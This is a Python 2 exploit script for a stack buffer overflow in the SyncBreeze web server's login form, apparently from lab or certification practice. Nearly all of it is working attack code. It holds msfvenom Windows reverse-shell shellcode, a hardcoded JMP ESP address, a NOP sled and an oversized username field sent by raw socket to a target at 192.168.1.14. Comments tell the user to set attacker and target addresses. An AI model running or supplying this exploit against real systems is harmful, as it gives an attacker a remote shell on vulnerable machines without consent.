
#This is the Final Code of Buffer Overflow of the SyncBreeze. 
#Make sure to change the LHOST , RHOST , LPORT and RPORT according to your IP.
#This script is based on python2

#!/usr/bin/python

import socket
import os
import sys


#msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=port -f python -a x86 --platform windows -b "\x00\x0a\x0d\x25\x26\x2b\x3d"

buf =  b""
buf += b"\xbe\x83\x70\xfc\xba\xd9\xf6\xd9\x74\x24\xf4\x5f\x33"
buf += b"\xc9\xb1\x52\x31\x77\x12\x83\xc7\x04\x03\xf4\x7e\x1e"
buf += b"\x4f\x06\x96\x5c\xb0\xf6\x67\x01\x38\x13\x56\x01\x5e"
buf += b"\x50\xc9\xb1\x14\x34\xe6\x3a\x78\xac\x7d\x4e\x55\xc3"
buf += b"\x36\xe5\x83\xea\xc7\x56\xf7\x6d\x44\xa5\x24\x4d\x75"
buf += b"\x66\x39\x8c\xb2\x9b\xb0\xdc\x6b\xd7\x67\xf0\x18\xad"
buf += b"\xbb\x7b\x52\x23\xbc\x98\x23\x42\xed\x0f\x3f\x1d\x2d"
buf += b"\xae\xec\x15\x64\xa8\xf1\x10\x3e\x43\xc1\xef\xc1\x85"
buf += b"\x1b\x0f\x6d\xe8\x93\xe2\x6f\x2d\x13\x1d\x1a\x47\x67"
buf += b"\xa0\x1d\x9c\x15\x7e\xab\x06\xbd\xf5\x0b\xe2\x3f\xd9"
buf += b"\xca\x61\x33\x96\x99\x2d\x50\x29\x4d\x46\x6c\xa2\x70"
buf += b"\x88\xe4\xf0\x56\x0c\xac\xa3\xf7\x15\x08\x05\x07\x45"
buf += b"\xf3\xfa\xad\x0e\x1e\xee\xdf\x4d\x77\xc3\xed\x6d\x87"
buf += b"\x4b\x65\x1e\xb5\xd4\xdd\x88\xf5\x9d\xfb\x4f\xf9\xb7"
buf += b"\xbc\xdf\x04\x38\xbd\xf6\xc2\x6c\xed\x60\xe2\x0c\x66"
buf += b"\x70\x0b\xd9\x29\x20\xa3\xb2\x89\x90\x03\x63\x62\xfa"
buf += b"\x8b\x5c\x92\x05\x46\xf5\x39\xfc\x01\x3a\x15\xff\xc9"
buf += b"\xd2\x64\xff\xed\xf0\xe0\x19\x87\xe4\xa4\xb2\x30\x9c"
buf += b"\xec\x48\xa0\x61\x3b\x35\xe2\xea\xc8\xca\xad\x1a\xa4"
buf += b"\xd8\x5a\xeb\xf3\x82\xcd\xf4\x29\xaa\x92\x67\xb6\x2a"
buf += b"\xdc\x9b\x61\x7d\x89\x6a\x78\xeb\x27\xd4\xd2\x09\xba"
buf += b"\x80\x1d\x89\x61\x71\xa3\x10\xe7\xcd\x87\x02\x31\xcd"
buf += b"\x83\x76\xed\x98\x5d\x20\x4b\x73\x2c\x9a\x05\x28\xe6"
buf += b"\x4a\xd3\x02\x39\x0c\xdc\x4e\xcf\xf0\x6d\x27\x96\x0f"
buf += b"\x41\xaf\x1e\x68\xbf\x4f\xe0\xa3\x7b\x7f\xab\xe9\x2a"
buf += b"\xe8\x72\x78\x6f\x75\x85\x57\xac\x80\x06\x5d\x4d\x77"
buf += b"\x16\x14\x48\x33\x90\xc5\x20\x2c\x75\xe9\x97\x4d\x5c"

#JMP ESP = 10090c83

crash = "A" * 780 + "\x83\x0c\x09\x10" + "\x90" * 20 + buf

fuzz="username="+crash+"&password=A"
buffer="POST /login HTTP/1.1\r\n"
buffer+="Host: 191.168.1.14\r\n"
buffer+="User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer+="Accept-Language: en-US,en;q=0.5\r\n"
buffer+="Referer: http://192.168.1.14/login\r\n"
buffer+="Connection: close\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="Content-Length: "+str(len(fuzz))+"\r\n"
buffer+="\r\n"
buffer+=fuzz
expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)


#RHOST = 192.168.1.14 (Change according to your IP)
#RPORT = 80 (Change according to your Vulnerable service port)

expl.connect(("192.168.1.14", 80))
expl.send(buffer)
expl.close()
